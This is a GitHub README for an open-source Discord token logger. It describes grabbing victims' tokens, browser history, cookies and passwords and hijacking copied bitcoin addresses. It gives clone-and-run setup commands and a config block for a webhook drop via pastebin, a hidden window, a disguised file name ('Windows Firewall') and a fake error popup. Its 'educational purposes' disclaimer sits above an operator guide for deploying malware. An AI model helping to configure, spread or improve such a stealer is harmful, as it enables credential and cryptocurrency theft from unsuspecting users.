# Discord-Info-Logger
A free, efficient, and open-source discord token logger, that also grabs history, cookies, passwords, and intercepts bitcoin addresses. This is purely for demonstration/educational purposes.

<p align="center">
<img src="https://user-images.githubusercontent.com/76016636/129282435-3fb34471-c880-433b-8910-da9ce7925cab.png" />
</p>

## Setup

Depending on your python installation your commands may vary. 
Below are the commands needed to set up.
The script was tested in python 3.8.6, on windows 10. This script only works on windows.

Windows:
```
git clone https://github.com/LocalsGitHub/Discord-Info-Logger.git
cd Discord-Info-Logger
pip install -r requirements.txt
py TokenLogger.py
```
## Config

Once you have opened the script in your desired text editor, there are 3 lines that you can change.
```
# Configuration
debugger = False <--- Change this if you are having any issues with the logger. It will print any errors.
BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v' <--- Change this to your own bitcoin address.
pastebin = "https://pastebin.com/raw/id" <--- Change this to your own pastebin link that contains your webhook.
hiddenWindow = False <--- Set this to True or False. If you want the window to be hidden on execution then set this to True.
FakeFileName = "Windows Firewall" <--- Change this to the fake desired name.
fakeError = True  <--- Set this to True or False. If you want a fake error message to popup then set it to True.
fakeErrorMessage = "An unexpected error has occured."  <--- If you have fakeError enabled, change this to what you want the fake error popup to say.
fakeErrorTitle = "Oops!" <--- If you have fakeError enabled, change this to what you want the fake error popup title to say.
```

# Support
Create an issue, or message me on discord.

# Credit

Credit to me for maintaining this project, adding the data logger, gofile upload, and fixing any bugs that arise, and small changes.<br>
Credit to checksum ([Github](https://github.com/ecriminal)) for the token logger<br>
Credit to NightFallGT ([Github](https://github.com/nightfallgt)) for the BTC Clipper<br>
Credit to anyone else who I forgot :)<br>
